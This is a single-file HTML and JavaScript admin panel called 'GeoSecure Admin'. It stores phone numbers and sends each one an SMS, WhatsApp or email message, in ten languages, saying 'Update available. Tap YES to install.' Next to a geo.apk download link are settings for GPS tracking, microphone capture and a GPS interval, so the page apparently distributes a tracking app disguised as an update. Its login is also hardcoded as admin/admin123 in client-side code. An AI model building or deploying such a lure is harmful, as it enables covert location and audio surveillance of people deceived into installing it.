<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>GeoSecure Admin</title>
  <style>
    :root {
      --bg: #0b1220;
      --panel: #0f172a;
      --muted: #94a3b8;
      --text: #e2e8f0;
      --accent: #22c55e;
      --accent-2: #3b82f6;
      --danger: #ef4444;
      --chip: #1f2a44;
      --chip-border: #2b3a5b;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0; background:linear-gradient(180deg,#0b1220,#0e1530);
      color:var(--text); font: 15px/1.4 system-ui, -apple-system, Segoe UI, Roboto, Arial;
    }
    .wrap{max-width:1000px;margin:0 auto;padding:24px}
    header{display:flex;gap:16px;align-items:center;justify-content:space-between;margin-bottom:16px}
    .brand{display:flex;align-items:center;gap:12px}
    .gear{width:28px;height:28px;display:grid;place-items:center;border-radius:8px;background:radial-gradient(ellipse at 30% 30%,#1c274a, #101a33);box-shadow:inset 0 0 12px #0006, 0 0 0 1px #223056}
    .gear svg{opacity:.9}
    .lang{display:flex;gap:8px;align-items:center}
    select, input[type="text"], input[type="password"], input[type="number"]{
      background:#0f1b35;border:1px solid #21325a;color:var(--text);padding:10px 12px;border-radius:10px;outline:none;width:100%;
    }
    select:focus, input:focus{border-color:#3b82f6; box-shadow:0 0 0 3px #3b82f620}
    .card{background:var(--panel);border:1px solid #1f2a44;border-radius:16px;padding:16px;box-shadow:0 6px 30px #0007}
    .grid{display:grid;gap:16px}
    @media (min-width: 900px){ .grid{grid-template-columns: 1.2fr .8fr} }
    .btn{border:none;background:#22325b;color:#dbeafe;padding:10px 14px;border-radius:10px;cursor:pointer}
    .btn:hover{filter:brightness(1.1)}
    .btn.primary{background:linear-gradient(180deg,#2dd4bf,#16a34a); color:#06230f; font-weight:700}
    .btn.blue{background:linear-gradient(180deg,#60a5fa,#2563eb); color:#06122b; font-weight:700}
    .btn.ghost{background:#12203f;color:#bcd0ff;border:1px solid #203260}
    .btn.red{background:#7f1d1d;color:#fecaca;border:1px solid #b91c1c}
    .row{display:flex;gap:10px;align-items:center}
    .row > *{flex:1}
    .muted{color:var(--muted)}
    .chips{display:flex;flex-wrap:wrap;gap:8px;margin-top:8px}
    .chip{display:flex;align-items:center;gap:8px;background:var(--chip);border:1px solid var(--chip-border);border-radius:999px;padding:6px 10px}
    .chip .x{cursor:pointer;opacity:.7}
    .hr{height:1px;background:#21325a;margin:14px 0}
    /* login */
    .center{min-height:100%;display:grid;place-items:center}
    .login{width:100%;max-width:380px}
    .login h1{margin:0 0 8px 0}
    .foot{display:flex;justify-content:space-between;gap:8px;align-items:center}
    small code{background:#0c1834;padding:2px 6px;border-radius:6px;border:1px solid #1c2e57}
    .kbd{padding:2px 6px;border-radius:6px;border:1px solid #203260;background:#111c39}
    .mono{font-family: ui-monospace,SFMono-Regular,Menlo,Consolas,Monaco,monospace}
  </style>
</head>
<body>
<div id="app"></div>

<script>
/* ================= I18N ================== */
const I18N = {
  en: {
    appTitle: "GeoSecure Admin",
    loginTitle: "Sign in",
    username: "Username",
    password: "Password",
    signIn: "Sign in",
    badLogin: "Wrong credentials.",
    langLabel: "Language",
    phonesTitle: "Phones",
    phonePlaceholder: "Enter phone number",
    add: "Add",
    send: "Send",
    sms: "SMS",
    whatsapp: "WhatsApp",
    email: "Email",
    copy: "Copy",
    remove: "Remove",
    settingsTitle: "Settings",
    apkUrl: "APK URL (leave empty if geo.apk in same folder)",
    gpsEnabled: "GPS enabled",
    micEnabled: "Mic enabled",
    interval: "GPS interval (seconds)",
    save: "Save",
    saved: "Saved",
    inviteText: "Update available. Tap YES to install.",
    footer: "Single-file admin panel. Data is stored locally in your browser.",
    downloadApk: "Download APK",
  },
  bg: {
    appTitle: "GeoSecure Админ",
    loginTitle: "Вход",
    username: "Потребител",
    password: "Парола",
    signIn: "Влез",
    badLogin: "Грешни данни.",
    langLabel: "Език",
    phonesTitle: "Телефони",
    phonePlaceholder: "Въведи телефонен номер",
    add: "Добави",
    send: "Изпрати",
    sms: "SMS",
    whatsapp: "WhatsApp",
    email: "E-mail",
    copy: "Копирай",
    remove: "Премахни",
    settingsTitle: "Настройки",
    apkUrl: "APK адрес (остави празно ако geo.apk е в същата папка)",
    gpsEnabled: "GPS включен",
    micEnabled: "Микрофон включен",
    interval: "Интервал за GPS (секунди)",
    save: "Запази",
    saved: "Запазено",
    inviteText: "Налична е актуализация. Натисни YES за инсталация.",
    footer: "Еднофайлов админ панел. Данните се пазят локално в браузъра.",
    downloadApk: "Свали APK",
  },
  es: {
    appTitle: "GeoSecure Admin",
    loginTitle: "Iniciar sesión",
    username: "Usuario",
    password: "Contraseña",
    signIn: "Entrar",
    badLogin: "Credenciales incorrectas.",
    langLabel: "Idioma",
    phonesTitle: "Teléfonos",
    phonePlaceholder: "Introduce número de teléfono",
    add: "Añadir",
    send: "Enviar",
    sms: "SMS",
    whatsapp: "WhatsApp",
    email: "Correo",
    copy: "Copiar",
    remove: "Eliminar",
    settingsTitle: "Ajustes",
    apkUrl: "URL del APK (dejar vacío si geo.apk está en la misma carpeta)",
    gpsEnabled: "GPS activado",
    micEnabled: "Micrófono activado",
    interval: "Intervalo de GPS (segundos)",
    save: "Guardar",
    saved: "Guardado",
    inviteText: "Actualización disponible. Pulsa YES para instalar.",
    footer: "Panel de administración de un solo archivo. Los datos se guardan localmente.",
    downloadApk: "Descargar APK",
  },
  pt: {
    appTitle: "GeoSecure Admin",
    loginTitle: "Entrar",
    username: "Usuário",
    password: "Senha",
    signIn: "Entrar",
    badLogin: "Credenciais inválidas.",
    langLabel: "Idioma",
    phonesTitle: "Telefones",
    phonePlaceholder: "Digite o número",
    add: "Adicionar",
    send: "Enviar",
    sms: "SMS",
    whatsapp: "WhatsApp",
    email: "E-mail",
    copy: "Copiar",
    remove: "Remover",
    settingsTitle: "Configurações",
    apkUrl: "URL do APK (deixe vazio se geo.apk está na mesma pasta)",
    gpsEnabled: "GPS ativado",
    micEnabled: "Microfone ativado",
    interval: "Intervalo do GPS (segundos)",
    save: "Salvar",
    saved: "Salvo",
    inviteText: "Atualização disponível. Toque em YES para instalar.",
    footer: "Painel de um único arquivo. Dados salvos localmente.",
    downloadApk: "Baixar APK",
  },
  fr: {
    appTitle: "GeoSecure Admin",
    loginTitle: "Connexion",
    username: "Utilisateur",
    password: "Mot de passe",
    signIn: "Se connecter",
    badLogin: "Identifiants incorrects.",
    langLabel: "Langue",
    phonesTitle: "Téléphones",
    phonePlaceholder: "Entrez un numéro",
    add: "Ajouter",
    send: "Envoyer",
    sms: "SMS",
    whatsapp: "WhatsApp",
    email: "E-mail",
    copy: "Copier",
    remove: "Supprimer",
    settingsTitle: "Paramètres",
    apkUrl: "URL de l'APK (laisser vide si geo.apk est dans le même dossier)",
    gpsEnabled: "GPS activé",
    micEnabled: "Micro activé",
    interval: "Intervalle GPS (secondes)",
    save: "Enregistrer",
    saved: "Enregistré",
    inviteText: "Mise à jour disponible. Appuyez sur YES pour installer.",
    footer: "Panneau administrateur mono-fichier. Données stockées localement.",
    downloadApk: "Télécharger APK",
  },
  de: {
    appTitle: "GeoSecure Admin",
    loginTitle: "Anmelden",
    username: "Benutzer",
    password: "Passwort",
    signIn: "Anmelden",
    badLogin: "Falsche Zugangsdaten.",
    langLabel: "Sprache",
    phonesTitle: "Telefone",
    phonePlaceholder: "Telefonnummer eingeben",
    add: "Hinzufügen",
    send: "Senden",
    sms: "SMS",
    whatsapp: "WhatsApp",
    email: "E-Mail",
    copy: "Kopieren",
    remove: "Entfernen",
    settingsTitle: "Einstellungen",
    apkUrl: "APK-URL (leer lassen, wenn geo.apk im selben Ordner)",
    gpsEnabled: "GPS aktiviert",
    micEnabled: "Mikrofon aktiviert",
    interval: "GPS-Intervall (Sekunden)",
    save: "Speichern",
    saved: "Gespeichert",
    inviteText: "Update verfügbar. Tippe YES, um zu installieren.",
    footer: "Ein-Datei-Adminpanel. Daten lokal gespeichert.",
    downloadApk: "APK herunterladen",
  },
  ru: {
    appTitle: "GeoSecure Админ",
    loginTitle: "Вход",
    username: "Логин",
    password: "Пароль",
    signIn: "Войти",
    badLogin: "Неверные данные.",
    langLabel: "Язык",
    phonesTitle: "Телефоны",
    phonePlaceholder: "Введите номер телефона",
    add: "Добавить",
    send: "Отправить",
    sms: "SMS",
    whatsapp: "WhatsApp",
    email: "E-mail",
    copy: "Копировать",
    remove: "Удалить",
    settingsTitle: "Настройки",
    apkUrl: "Ссылка на APK (оставьте пустой, если geo.apk в той же папке)",
    gpsEnabled: "GPS включён",
    micEnabled: "Микрофон включён",
    interval: "Интервал GPS (секунды)",
    save: "Сохранить",
    saved: "Сохранено",
    inviteText: "Доступно обновление. Нажмите YES для установки.",
    footer: "Админ-панель в одном файле. Данные сохраняются локально.",
    downloadApk: "Скачать APK",
  },
  ar: {
    appTitle: "لوحة إدارة GeoSecure",
    loginTitle: "تسجيل الدخول",
    username: "اسم المستخدم",
    password: "كلمة المرور",
    signIn: "دخول",
    badLogin: "بيانات غير صحيحة.",
    langLabel: "اللغة",
    phonesTitle: "الأرقام",
    phonePlaceholder: "أدخل رقم الهاتف",
    add: "إضافة",
    send: "إرسال",
    sms: "رسالة",
    whatsapp: "واتساب",
    email: "بريد",
    copy: "نسخ",
    remove: "حذف",
    settingsTitle: "الإعدادات",
    apkUrl: "رابط APK (اتركه فارغًا إذا كان geo.apk في نفس المجلد)",
    gpsEnabled: "تفعيل GPS",
    micEnabled: "تفعيل الميكروفون",
    interval: "الفاصل الزمني (ثوانٍ)",
    save: "حفظ",
    saved: "تم الحفظ",
    inviteText: "يوجد تحديث. اضغط YES للتثبيت.",
    footer: "ملف واحد فقط. يتم حفظ البيانات محليًا.",
    downloadApk: "تنزيل APK",
  },
  hi: {
    appTitle: "GeoSecure एडमिन",
    loginTitle: "साइन इन",
    username: "यूज़रनेम",
    password: "पासवर्ड",
    signIn: "लॉगिन",
    badLogin: "गलत जानकारी।",
    langLabel: "भाषा",
    phonesTitle: "फ़ोन",
    phonePlaceholder: "फ़ोन नंबर दर्ज करें",
    add: "जोड़ें",
    send: "भेजें",
    sms: "SMS",
    whatsapp: "व्हाट्सएप",
    email: "ईमेल",
    copy: "कॉपी",
    remove: "हटाएँ",
    settingsTitle: "सेटिंग्स",
    apkUrl: "APK लिंक (खाली छोड़ें अगर geo.apk यही फ़ोल्डर में है)",
    gpsEnabled: "GPS चालू",
    micEnabled: "माइक चालू",
    interval: "GPS अंतराल (सेकंड)",
    save: "सेव",
    saved: "सेव हुआ",
    inviteText: "अपडेट उपलब्ध है। इंस्टॉल के लिए YES दबाएँ।",
    footer: "सिंगल-फ़ाइल एडमिन पैनल. डेटा लोकल स्टोरेज में।",
    downloadApk: "APK डाउनलोड करें",
  },
  zh: {
    appTitle: "GeoSecure 管理",
    loginTitle: "登录",
    username: "用户名",
    password: "密码",
    signIn: "登录",
    badLogin: "账号或密码错误。",
    langLabel: "语言",
    phonesTitle: "手机号",
    phonePlaceholder: "输入手机号",
    add: "添加",
    send: "发送",
    sms: "短信",
    whatsapp: "WhatsApp",
    email: "邮箱",
    copy: "复制",
    remove: "删除",
    settingsTitle: "设置",
    apkUrl: "APK 链接（若 geo.apk 与本页同目录可留空）",
    gpsEnabled: "启用 GPS",
    micEnabled: "启用麦克风",
    interval: "GPS 间隔（秒）",
    save: "保存",
    saved: "已保存",
    inviteText: "有可用更新。点击 YES 进行安装。",
    footer: "单文件管理面板。数据保存在浏览器本地。",
    downloadApk: "下载 APK",
  }
};

const LANGS = [
  {code:'en', label:'English'},
  {code:'bg', label:'Български'},
  {code:'es', label:'Español'},
  {code:'pt', label:'Português'},
  {code:'fr', label:'Français'},
  {code:'de', label:'Deutsch'},
  {code:'ru', label:'Русский'},
  {code:'ar', label:'العربية'},
  {code:'hi', label:'हिंदी'},
  {code:'zh', label:'简体中文'}
];

/* ================ STATE ================ */
const STORAGE_KEY = 'geo_admin_state_v1';
const DEFAULT_STATE = {
  phones: [],
  apkUrl: '',
  gpsEnabled: true,
  micEnabled: false,
  gpsInterval: 5,
  lang: 'en'
};
let state = loadState();

function t(key){ const dict = I18N[state.lang] || I18N.en; return dict[key] || key; }
function saveState(){ localStorage.setItem(STORAGE_KEY, JSON.stringify(state)); }
function loadState(){
  try{ const j = localStorage.getItem(STORAGE_KEY); if(j) return {...DEFAULT_STATE, ...JSON.parse(j)}; }catch(e){}
  return {...DEFAULT_STATE};
}
function setLang(lang){ state.lang = lang; saveState(); render(); }
function addPhone(p){ if(!p) return; if(state.phones.length>=30) return alert('Max 30 phones'); if(!state.phones.includes(p)){ state.phones.push(p); saveState(); render(); } }
function delPhone(p){ state.phones = state.phones.filter(x=>x!==p); saveState(); render(); }

function smsBody(){ return encodeURIComponent(t('inviteText')); }

function makeSMS(phone){ return `sms:${encodeURIComponent(phone)}?&body=${smsBody()}`; }
function makeWA(phone){ return `https://wa.me/${encodeURIComponent(phone)}?text=${smsBody()}`; }
function makeMail(phone){ return `mailto:?subject=${encodeURIComponent('GeoUpdate')}&body=${smsBody()}%0A${encodeURIComponent(phone)}`; }

/* ================ UI ================ */
function el(tag, attrs={}, ...children){
  const e = document.createElement(tag);
  for(const [k,v] of Object.entries(attrs)){
    if(k==='class') e.className = v;
    else if(k==='html') e.innerHTML = v;
    else if(k.startsWith('on') && typeof v==='function') e.addEventListener(k.slice(2), v);
    else e.setAttribute(k,v);
  }
  for(const c of children) e.appendChild(typeof c==='string'? document.createTextNode(c) : c);
  return e;
}

function header(){
  return el('header',{},
    el('div',{class:'brand'},
      el('div',{class:'gear',title:'GeoSecure'}, el('svg',{width:18,height:18,viewBox:'0 0 24 24',fill:'none',stroke:'#9fb4ff','stroke-width':'2'}, 
        el('path',{d:'M12 15.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7Z'}),
        el('path',{d:'M19.4 15a1 1 0 0 0 .2 1.1l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1 1 0 0 0-1.1-.2 8 8 0 0 1-3 .6 1 1 0 0 0-1 1V21a2 2 0 1 1-4 0v-.1a1 1 0 0 0-1-1 8 8 0 0 1-3-.6 1 1 0 0 0-1.1.2l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1 1 0 0 0 .2-1.1 8 8 0 0 1 0-3 1 1 0 0 0-.2-1.1l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1 1 0 0 0 1.1.2 8 8 0 0 1 3-.6 1 1 0 0 0 1-1V3a2 2 0 1 1 4 0v.1a1 1 0 0 0 1 1 8 8 0 0 1 3 .6 1 1 0 0 0 1.1-.2l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1 1 0 0 0-.2 1.1 8 8 0 0 1 0 3Z'})
      )),
      el('strong',{}, t('appTitle'))
    ),
    el('div',{class:'lang'},
      el('label',{for:'langSel',class:'muted'}, t('langLabel')+':'),
      (function(){
        const s = el('select',{id:'langSel',onchange:(e)=>setLang(e.target.value)});
        for(const l of LANGS){ const o = el('option',{value:l.code}, l.label); if(l.code===state.lang) o.selected=true; s.appendChild(o); }
        return s;
      })()
    )
  );
}

function phonesCard(){
  const input = el('input',{id:'phoneInput',type:'text',placeholder:t('phonePlaceholder')});
  const addBtn = el('button',{class:'btn primary',onclick:()=>addPhone(input.value.trim())}, t('add'));
  const chips = el('div',{class:'chips'});
  for(const p of state.phones){
    chips.appendChild(
      el('div',{class:'chip'},
        el('span',{class:'mono'}, p),
        el('button',{class:'btn',onclick:()=>window.open(makeSMS(p),'_blank')}, t('sms')),
        el('button',{class:'btn',onclick:()=>window.open(makeWA(p),'_blank')}, 'WA'),
        el('button',{class:'btn',onclick:()=>window.open(makeMail(p),'_blank')}, t('email')),
        el('button',{class:'btn ghost',onclick:()=>{navigator.clipboard.writeText(p);}}, t('copy')),
        el('span',{class:'x',onclick:()=>delPhone(p)}, '✕')
      )
    );
  }
  const guessApk = state.apkUrl || (location.origin + '/geo.apk');
  const downloadBtn = el('a',{href:guessApk, class:'btn blue', target:'_blank'}, t('downloadApk'));

  return el('div',{class:'card'},
    el('h3',{}, t('phonesTitle')),
    el('div',{class:'row'}, input, addBtn, downloadBtn),
    el('div',{class:'hr'}),
    chips
  );
}

function settingsCard(){
  const url = el('input',{type:'text',value:state.apkUrl,placeholder:t('apkUrl'),oninput:(e)=>state.apkUrl=e.target.value});
  const gps = el('input',{type:'checkbox'}); gps.checked = state.gpsEnabled; gps.onchange = ()=> state.gpsEnabled=gps.checked;
  const mic = el('input',{type:'checkbox'}); mic.checked = state.micEnabled; mic.onchange = ()=> state.micEnabled=mic.checked;
  const interval = el('input',{type:'number',min:'1',max:'600',value:state.gpsInterval,oninput:(e)=>state.gpsInterval=parseInt(e.target.value||'1')});

  const saveBtn = el('button',{class:'btn primary',onclick:()=>{ saveState(); toast(t('saved')); }}, t('save'));
  const mute = el('div',{class:'muted',style:'margin-top:10px'}, t('footer'));

  return el('div',{class:'card'},
    el('h3',{}, t('settingsTitle')),
    el('div',{}, el('label',{}, t('apkUrl')), url),
    el('div',{class:'row',style:'margin-top:10px'},
      el('label',{}, el('input',{type:'checkbox',checked:state.gpsEnabled,onchange:(e)=>state.gpsEnabled=e.target.checked}), ' ', t('gpsEnabled')),
      el('label',{}, el('input',{type:'checkbox',checked:state.micEnabled,onchange:(e)=>state.micEnabled=e.target.checked}), ' ', t('micEnabled'))
    ),
    el('div',{class:'row',style:'margin-top:10px'},
      el('div',{}, el('label',{}, t('interval')), interval)
    ),
    el('div',{style:'margin-top:12px'}, saveBtn),
    mute
  );
}

function toast(msg){
  const t = el('div',{style:`position:fixed;bottom:20px;right:20px;background:#182549;color:#cfe3ff;border:1px solid #2a3c69;padding:10px 12px;border-radius:10px;box-shadow:0 8px 30px #000c`}, msg);
  document.body.appendChild(t);
  setTimeout(()=>t.remove(), 1700);
}

function appView(){
  return el('div',{class:'wrap'},
    header(),
    el('div',{class:'grid'}, phonesCard(), settingsCard())
  );
}

function loginView(){
  let uInput, pInput;
  function submit(){
    const u = uInput.value.trim(), p = pInput.value.trim();
    if(u==='admin' && p==='admin123'){ sessionStorage.setItem('auth','1'); render(); }
    else toast(t('badLogin'));
  }
  return el('div',{class:'center'},
    el('div',{class:'login card'},
      el('div',{class:'brand',style:'margin-bottom:10px'}, el('div',{class:'gear'}, '⚙️'), el('h1',{}, t('loginTitle'))),
      el('label',{}, t('username')),
      (uInput = el('input',{type:'text',placeholder:'admin'})),
      el('div',{style:'height:8px'}),
      el('label',{}, t('password')),
      (pInput = el('input',{type:'password',placeholder:'admin123'})),
      el('div',{style:'height:12px'}),
      el('div',{class:'row foot'},
        el('div',{}, el('small',{}, t('langLabel')+': '), (function(){const s = el('select',{onchange:(e)=>setLang(e.target.value)}); for(const l of LANGS){ const o = el('option',{value:l.code}, l.label); if(l.code===state.lang) o.selected=true; s.appendChild(o);} return s;})()),
        el('button',{class:'btn primary',onclick:submit}, t('signIn'))
      ),
      el('div',{class:'hr'}),
      el('small',{class:'muted'}, t('footer'))
    )
  );
}

function render(){
  const authed = sessionStorage.getItem('auth')==='1';
  const root = document.getElementById('app');
  root.innerHTML = '';
  root.appendChild(authed? appView() : loginView());
}
render();
</script>
</body>
</html>
